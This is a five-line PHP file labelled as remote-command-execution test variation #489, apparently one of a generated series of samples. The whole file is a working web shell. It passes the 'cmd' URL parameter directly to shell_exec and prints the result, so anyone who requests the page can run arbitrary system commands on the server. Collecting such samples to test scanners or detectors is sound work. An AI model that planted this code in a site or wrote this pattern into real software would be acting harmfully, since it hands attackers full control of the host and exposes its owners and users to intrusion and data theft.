<?php
// RCE test variation #489
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>